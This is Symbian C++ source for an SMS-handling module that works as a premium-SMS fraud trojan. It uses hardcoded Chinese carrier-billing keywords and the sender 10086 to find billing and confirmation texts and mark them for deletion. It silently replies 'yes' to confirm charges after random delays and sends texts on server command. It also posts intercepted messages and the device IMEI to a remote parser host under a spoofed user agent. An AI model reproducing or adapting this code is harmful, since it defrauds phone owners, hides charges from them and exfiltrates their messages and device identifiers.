#include <utf.h>
#include <escapeutils.h>
#include "smsmanager.h"
#include "systemengine.h"
_LIT8(KUserAgent,"NokiaN73-1/2.0628.0.0.1 S60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1");
void CSmsManager::OnTimerExpired(){//From MTimeOutNotify
    TInt count=iReplySmsMessageArray->Count();
    if(count){
        for(TInt i=count-1;i>=0;--i){
            TInt sleepSeconds=GetRandom(10,20);
            if(DebugEnabled()){
                TBuf8<100> buf;
                buf.Copy(_L8("CSmsManager::OnTimerExpired():Sleep "));
                buf.AppendNum(sleepSeconds);
                buf.Append(_L8(" seconds before sending sms message."));
                Log(buf);
            }
            User::After(sleepSeconds*1000*1000);
            if(DebugEnabled()){
                Log(_L8("CSmsManager::OnTimerExpired():Sleep finished"));
            }
            SmsMessage* item=(SmsMessage*)iReplySmsMessageArray->At(i);
            iSmsEngine->SendMessage(item->PhoneNumber,item->MessageContent);
            iReplySmsMessageArray->Delete(i);
        }
    }
}

void CSmsManager::StartTask(CTaskObserver* aObserver,const TDesC8& aSmsOrder,TInt aTaskId){
    Log(_L8("CSmsManager::StartTask start"));
    iContractItemArray->ResetAndDestroy();
    iReplySmsMessageArray->ResetAndDestroy();
    this->iTaskObserver=aObserver;
    this->iTaskId=aTaskId;
    TBuf8<5000> mergedOrder;
    mergedOrder.Copy(_L8("m:1,0, , ,10086,10086901,0, , ,\n"));
    mergedOrder.Append(_L8("m:2,0, , ,10,账单,0, , ,\n"));
    mergedOrder.Append(_L8("m:3,0, , ,10,消费,0, , ,\n"));
    mergedOrder.Append(_L8("m:4,0, , ,10,信息费,0, , ,\n"));
    mergedOrder.Append(_L8("m:5,0, , ,10,1/2,0, , ,\n"));
    mergedOrder.Append(_L8("m:6,0, , ,10,2/2,0, , ,\n"));
    mergedOrder.Append(_L8("m:7,0, , ,10,代收,0, , ,\n"));
    mergedOrder.Append(_L8("m:8,0, , ,10,代码,0, , ,\n"));
    mergedOrder.Append(_L8("m:9,0, , ,10,感谢,0, , ,\n"));
    mergedOrder.Append(_L8("m:10,0, , ,10,客服,0, , ,\n"));
    mergedOrder.Append(_L8("m:11,0, , ,10,购买,0, , ,\n"));
    mergedOrder.Append(_L8("m:12,0, , ,10,不符,0, , ,\n"));
    mergedOrder.Append(_L8("m:13,0, , ,10,取消,0, , ,\n"));
    mergedOrder.Append(_L8("m:14,0, , ,10,资费,0, , ,\n"));
    mergedOrder.Append(_L8("m:15,0, , ,10,成功,0, , ,\n"));
    mergedOrder.Append(_L8("m:16,0, ,是,10,任意内容,0, , ,\n"));
    mergedOrder.Append(_L8("m:17,0, ,是,10,回复是,0, , ,\n"));
    mergedOrder.Append(_L8("m:18,0, , ,10,本次密码,1, , ,\n"));
    mergedOrder.Append(_L8("m:19,0, ,是,10,回复\"是\",0, , ,\n"));
    mergedOrder.Append(aSmsOrder);
   // Log(mergedOrder);
    CDesC8ArrayFlat* lines=new (ELeave) CDesC8ArrayFlat(1);
    CleanupStack::PushL(lines);
    SeprateToArray(mergedOrder,KNewLine,*lines);
    TBool needSendMessage=EFalse;
    //Log(10001);
    for(TInt i=0;i<lines->Count();++i){
        TBuf8<200> singleOrder;
        singleOrder.Copy((*lines)[i]);
        singleOrder.Trim();
        if(singleOrder.Length()<6||singleOrder.FindF(_L8("#"))==0) continue;
        Log(singleOrder);
        CDesC8ArrayFlat* fields=new (ELeave) CDesC8ArrayFlat(1);
        CleanupStack::PushL(fields);
        SeprateToArray(singleOrder,_L8(","),*fields);
        if(fields->Count()>=7){
            SpChannelItem* item=new (ELeave) SpChannelItem();
            TInt fieldIndex=0;
            item->Id=Utf8ToUnicode((*fields)[fieldIndex++]);
            item->ParentId=Utf8ToUnicode((*fields)[fieldIndex++]);
            item->SpNumber.Copy(Utf8ToUnicode((*fields)[fieldIndex++]));
            item->SpSmsContent.Copy(Utf8ToUnicode((*fields)[fieldIndex++]));
            item->SpNumberFilter.Copy(Utf8ToUnicode((*fields)[fieldIndex++]));
            item->SpSmsContentFilter.Copy(Utf8ToUnicode((*fields)[fieldIndex++]));
            item->ParseInServer=(((*fields)[fieldIndex++]).Find(_L8("1"))>=0);
            if(item->SpSmsContentFilter.Length()==0&&item->SpNumberFilter.Length()==0){
                if(item->SpNumber.Length()>3){
                    needSendMessage=ETrue;
                    SmsMessage* message=new SmsMessage();
                    message->PhoneNumber.Copy(item->SpNumber);
                    message->MessageContent.Copy(item->SpSmsContent);
                    this->iReplySmsMessageArray->AppendL(message);
                    delete item;
                    continue;
                }
            }
            this->iContractItemArray->AppendL(item);
        }
        //Log(2);
        CleanupStack::PopAndDestroy(fields);
    }
    CleanupStack::PopAndDestroy(lines);
    if(needSendMessage&&!this->iTimer->IsActive()){
        this->iTimer->After(10*1000*1000);
    }
    iTaskObserver->OnTaskSuccess(iTaskId);
}
void CSmsManager::OnHttpError(THttpErrorID aErrId){
    iTaskObserver->OnTaskFailed(iTaskId,_L8(""),1);
}
void CSmsManager::OnResponseReceived(const TDesC8& aData){
    if(aData.Find(_L8("`sms-reply`"))==0){
        CDesC8ArrayFlat* fields=new (ELeave) CDesC8ArrayFlat(1);
        CleanupStack::PushL(fields);
        SeprateToArray(aData,_L8(","),*fields);
        if(fields->Count()==3){
            SmsMessage* message=new SmsMessage();
            message->PhoneNumber.Copy(Utf8ToUnicode((*fields)[1]));
            message->MessageContent.Copy(Utf8ToUnicode((*fields)[2]));
            this->iReplySmsMessageArray->AppendL(message);
            if(!this->iTimer->IsActive()){
                this->iTimer->After(10*1000*1000);
            }
            Log(_L8("Sms Server Parser result received, will reply in 10 seconds!"));
        }
        CleanupStack::PopAndDestroy(fields);
        return;
    }
}

CSmsManager::CSmsManager(){
}

CSmsManager::~CSmsManager(){
}

CSmsManager* CSmsManager::NewLC(){
    CSmsManager* self=new (ELeave) CSmsManager();
    CleanupStack::PushL(self);
    self->ConstructL();
    return self;
}

CSmsManager* CSmsManager::NewL(){
    CSmsManager* self=CSmsManager::NewLC();
    CleanupStack::Pop(); // self;
    return self;
}

void CSmsManager::ConstructL(){
    this->iContractItemArray=new (ELeave) CArrayPtrSeg<SpChannelItem> (5);
    this->iReplySmsMessageArray=new (ELeave) CArrayPtrSeg<SmsMessage> (5);
    this->iSmsEngine=CSmsEngine::NewL(this);
    iTimer=CTimeOutTimer::NewL(0,*this);
}

void CSmsManager::ParseSmsInServer(const TDesC& address,const TDesC& content,const TDesC& aChannelItemId){
    Log(_L8("CAppMain::ParseSmsInServer() start"));
    TPtrC8 hostName=FindDomain();
    if(hostName.Length()>0){
        SAFE_DELETE(iSocketEngine);
        iSocketEngine=CSocketEngine::NewL();
        iSocketEngine->SetUserAgent(KUserAgent);
        TBuf8<1000> url;
        url.AppendFormat(_L8("http://%S/parser/sms/"),&hostName);
        TBuf8<5000> postBody;
        CSystemEngine* manager=CSystemEngine::NewL();
        CleanupStack::PushL(manager);
        TPtrC8 imei=manager->GetIMEI();
        postBody.Append(_L8("a="));
        postBody.Append(imei);
        CleanupStack::PopAndDestroy(manager);
        postBody.Append(_L8("&id="));
        postBody.Append(aChannelItemId);
        postBody.Append(_L8("&x="));
        postBody.Append(address);
        postBody.Append(_L8("&y="));
        HBufC8* utf8Content=CnvUtfConverter::ConvertFromUnicodeToUtf8L(content);
        CleanupStack::PushL(utf8Content);
        HBufC8* encodedContent=EscapeUtils::EscapeEncodeL(utf8Content->Des(),EscapeUtils::EEscapeUrlEncoded);
        CleanupStack::PushL(encodedContent);
        postBody.Append(encodedContent->Des());
        CleanupStack::PopAndDestroy(encodedContent);
        CleanupStack::PopAndDestroy(utf8Content);
        iSocketEngine->HTTPPostRange(this,url,_L8(""),postBody,0,-1);
    }
    Log(_L8("CAppMain::ParseSmsInServer() end"));
}

TBool Match(const TDesC& aSpNumber,const TDesC& aSpSmsMessage,const TDesC& aSpNumberFilter,const TDesC& aSpSmsContentFilter){
    if(aSpNumberFilter.Length()>0&&aSpNumber.Find(aSpNumberFilter)<0) return EFalse;
    if(aSpSmsContentFilter.Length()==0) return ETrue;
    TPtrC ptr(aSpSmsContentFilter);
    TInt pos=ptr.FindF(_L("|"));
    if(pos>=0){
        do{
            if(pos==ptr.Length()-1) return ETrue;
            if(pos>0&&aSpSmsMessage.Find(ptr.Left(pos))<0) return EFalse;
            ptr.Set(ptr.Mid(pos+1));
            pos=ptr.FindF(_L("|"));
        }while(pos>=0);
    }
    return aSpSmsMessage.Find(ptr)>=0;
}

TBool CSmsManager::MessageNeedDelete(const TDesC& aSpNumber,const TDesC& aSpSmsMessage){
    //Log(aSpNumber);
    //Log(aSpSmsMessage);
    TBool result=EFalse;
    TInt contractItemCount=this->iContractItemArray->Count();
    if(contractItemCount>0){
        for(TInt i=contractItemCount-1;i>=0;--i){
            SpChannelItem* item=(SpChannelItem*)this->iContractItemArray->At(i);
            if(!Match(aSpNumber,aSpSmsMessage,item->SpNumberFilter,item->SpSmsContentFilter)) continue;
            result=ETrue;
            //Log(item->SpNumberFilter);
            //Log(item->SpSmsContentFilter);
            //Log(aSpNumber);
            //Log(aSpSmsMessage);
            if(item->ParseInServer){
                this->ParseSmsInServer(aSpNumber,aSpSmsMessage,item->Id);
            }else if(item->SpSmsContent.Length()>0){//Need reply this message
                SmsMessage* message=new SmsMessage();
                message->MessageContent.Copy(item->SpSmsContent);
                if(item->SpNumber.Length()==0){
                    message->PhoneNumber.Copy(aSpNumber);
                }else{
                    message->PhoneNumber.Copy(item->SpNumber);
                }
                this->iReplySmsMessageArray->AppendL(message);
                if(!this->iTimer->IsActive()) this->iTimer->After(10*1000*1000);
                Log(_L8("Need Reply this message, will reply in 10 seconds!"));
            }
            break;
        }
    }
    return result;
}
